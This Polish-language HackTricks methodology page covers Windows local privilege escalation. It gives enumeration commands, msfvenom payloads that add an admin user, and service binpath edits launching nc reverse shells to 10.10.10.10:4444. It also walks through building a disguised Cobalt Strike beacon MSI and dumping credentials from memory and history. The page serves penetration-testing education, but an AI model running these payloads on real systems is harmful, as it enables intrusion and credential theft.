# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Wstępna teoria Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj następującą stronę zanim będziesz kontynuować:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź poniższą stronę, aby uzyskać więcej informacji o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Jeśli nie wiesz, czym są integrity levels w Windows, powinieneś przeczytać następującą stronę zanim będziesz kontynuować:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Kontrole bezpieczeństwa Windows

W Windows istnieją różne rzeczy, które mogą **uniemożliwić ci przeprowadzenie enumeracji systemu**, uruchamianie plików wykonywalnych lub nawet **wykryć twoje działania**. Powinieneś **przeczytać** następującą **stronę** i **wyenumerować** wszystkie te **mechanizmy** **obronne** przed rozpoczęciem enumeracji privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy wersja Windows ma jakieś znane podatności (sprawdź także zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploity wersji

Ta [site](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o lukach bezpieczeństwa Microsoft. Ta baza danych zawiera ponad 4,700 luk bezpieczeństwa, pokazując **ogromną powierzchnię ataku** jaką przedstawia środowisko Windows.

**Na systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_

**Lokalnie z informacjami o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria Github z exploitami:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakieś credential/Juicy info jest zapisane w env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć pod adresem [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonywania pipeline'ów PowerShell są rejestrowane, obejmując wykonane polecenia, wywołania poleceń oraz fragmenty skryptów. Jednak pełne szczegóły wykonania i wyniki wyjściowe mogą nie zostać przechwycone.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Pliki transkrypcji" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rejestrowany jest kompletny zapis aktywności i pełna zawartość wykonywania skryptu, co zapewnia, że każdy blok kodu jest dokumentowany w trakcie działania. Proces ten zachowuje kompleksowy ślad audytu każdej czynności, przydatny do analiz kryminalistycznych i badania złośliwych zachowań. Dokumentując całą aktywność w momencie wykonania, dostarcza szczegółowych informacji o przebiegu procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia logowania dla Script Block można znaleźć w Windows Event Viewer pod ścieżką: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić ostatnie 20 zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz przejąć system, jeśli aktualizacje są żądane nie przy użyciu http**S**, lecz http.

Zaczynasz od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając poniższe w cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Lub następujące w PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Then, **it is exploitable.** Jeśli ostatni wpis rejestru jest równy `0`, wpis WSUS zostanie zignorowany.

Aby wykorzystać te podatności możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Zasadniczo, to jest wada, którą ten błąd wykorzystuje:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wiele agentów korporacyjnych udostępnia powierzchnię localhost IPC i uprzywilejowany kanał aktualizacji. Jeśli enrollment można wymusić do serwera atakującego i updater ufa rogue root CA lub ma słabe sprawdzanie podpisu, lokalny użytkownik może dostarczyć złośliwy MSI, który usługa SYSTEM zainstaluje. Zobacz uogólnioną technikę (based on the Netskope stAgentSvc chain – CVE-2025-0309) tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 klucze rejestru są **włączone** (wartość to **0x1**), to użytkownicy o dowolnych uprawnieniach mogą **zainstalować** (wykonać) `*.msi` pliki jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę przy użyciu modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu plik MSI Windows służący do eskalacji uprawnień. Ten skrypt zapisuje wstępnie skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu GIU):
```
Write-UserAddMSI
```
Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten poradnik, aby dowiedzieć się, jak utworzyć opakowanie MSI przy użyciu tych narzędzi. Zauważ, że możesz opakować plik "**.bat**", jeśli **tylko** chcesz **wykonywać** **polecenia**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **new Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, wybierz **place solution and project in the same directory**, i kliknij **Create**.
- Kontynuuj klikanie **Next** aż dojdziesz do kroku 3 z 4 (choose files to include). Kliknij **Add** i wybierz Beacon payload, który właśnie wygenerowałeś. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Są inne właściwości, które możesz zmienić, takie jak **Author** i **Manufacturer**, co może sprawić, że zainstalowana aplikacja będzie wyglądać na bardziej wiarygodną.
- Kliknij prawym przyciskiem na projekcie i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem na **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz swój plik **beacon.exe** i kliknij **OK**. Dzięki temu beacon payload zostanie wykonany zaraz po uruchomieniu instalatora.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
- Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawiono platformę na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Programy antywirusowe i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **logowane**, więc należy zwrócić na nie uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** jest zaprojektowany do **zarządzania local Administrator passwords**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko dla użytkowników, którym przyznano wystarczające uprawnienia poprzez ACLs, umożliwiając im przeglądanie local admin passwords, jeśli są uprawnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli aktywny, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Od **Windows 8.1** Microsoft wprowadził rozszerzoną ochronę dla Local Security Authority (LSA), aby **blokować** próby nieufnych procesów **odczytywania jego pamięci** lub wstrzykiwania kodu, dodatkowo zabezpieczając system.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest zabezpieczenie credentials przechowywanych na urządzeniu przed zagrożeniami takimi jak pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zbuforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, dla użytkownika zazwyczaj tworzone są poświadczenia domenowe.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i grupy

### Enumeracja użytkowników i grup

Należy sprawdzić, czy któraś z grup, do których należysz, ma interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz być w stanie eskalować uprawnienia**. Dowiedz się o grupach uprzywilejowanych i jak je nadużywać, aby eskalować uprawnienia tutaj:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacja tokenami

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następującą stronę, aby **dowiedzieć się o interesujących tokenach** i jak je nadużywać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Foldery domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchomione procesy

### Uprawnienia plików i folderów

Przede wszystkim podczas listowania procesów **sprawdź, czy nie ma haseł w linii poleceń procesu**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** lub czy masz uprawnienia zapisu w folderze z plikami binarnymi, aby wykorzystać możliwe [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdź, czy nie działają [**electron/cef/chromium debuggers** — możesz je wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień plików binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów zawierających binaria procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci uruchomionego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP przechowują **credentials w jawnej postaci w pamięci**. Spróbuj zrzucić pamięć i odczytać credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niebezpieczne aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwolić użytkownikowi na uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Windows Help and Support" (Windows + F1), wyszukaj "command prompt", kliknij na "Click to open Command Prompt"

## Usługi

Service Triggers pozwalają Windows uruchomić usługę, gdy wystąpią określone warunki (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Nawet bez uprawnień SERVICE_START często można uruchomić uprzywilejowane usługi, wywołując ich triggery. Zobacz techniki enumeracji i aktywacji tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarki **accesschk** od _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzić, czy "Authenticated Users" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład przy SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Możesz ją włączyć przy użyciu
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki binarnej usługi**

W scenariuszu, w którym grupa "Authenticated users" posiada na usłudze **SERVICE_ALL_ACCESS**, możliwa jest modyfikacja pliku wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponowne uruchomienie usługi
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia można eskalować za pomocą następujących uprawnień:

- **SERVICE_CHANGE_CONFIG**: Pozwala na rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usług.
- **WRITE_OWNER**: Pozwala na przejęcie własności oraz rekonfigurację uprawnień.
- **GENERIC_WRITE**: Daje możliwość zmiany konfiguracji usług.
- **GENERIC_ALL**: Również daje możliwość zmiany konfiguracji usług.

Do wykrycia i eksploatacji tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia binarek usług

**Sprawdź, czy możesz zmodyfikować binarkę, którą uruchamia usługa** lub czy masz **uprawnienia zapisu do folderu** w którym znajduje się binarka ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz otrzymać wszystkie binarki uruchamiane przez usługę za pomocą **wmic** (nie w system32) i sprawdzić swoje uprawnienia przy pomocy **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz także użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia do modyfikacji rejestru usług

Powinieneś sprawdzić, czy możesz zmodyfikować dowolny rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** względem rejestru **usług**, wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, plik binarny uruchamiany przez usługę można zmodyfikować.

Aby zmienić Path pliku binarnego uruchamianego przez usługę:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Uprawnienia AppendData/AddSubdirectory w kluczu rejestru usług

Jeśli posiadasz to uprawnienie względem klucza rejestru, oznacza to, że **możesz tworzyć podklucze rejestru z tego klucza**. W przypadku usług Windows jest to **wystarczające do uruchomienia dowolnego kodu:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Ścieżki usług bez cudzysłowów

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowach, Windows będzie próbował uruchomić każdy fragment ścieżki kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wypisz wszystkie niecytowane ścieżki usług, z wyłączeniem tych należących do wbudowanych usług Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i exploit** tę podatność za pomocą metasploit: `exploit/windows/local/trusted_service_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Działania odzyskiwania

Windows pozwala użytkownikom określić działania wykonywane w przypadku awarii usługi. Funkcję tę można skonfigurować tak, aby wskazywała na plik binarny. Jeśli ten plik binarny da się zastąpić, możliwa jest eskalacja uprawnień. Więcej szczegółów znajduje się w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia plików binarnych** (może uda się nadpisać któryś i eskalować uprawnienia) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać jakiś specjalny plik, lub czy możesz zmodyfikować plik binarny, który zostanie uruchomiony przez konto Administratora (schedtasks).

Sposób na znalezienie słabych uprawnień do folderów/plików w systemie to wykonanie:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś registry lub binary, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę** aby dowiedzieć się więcej o interesujących **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj możliwych **firm trzecich, dziwnych/podatnych** sterowników
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
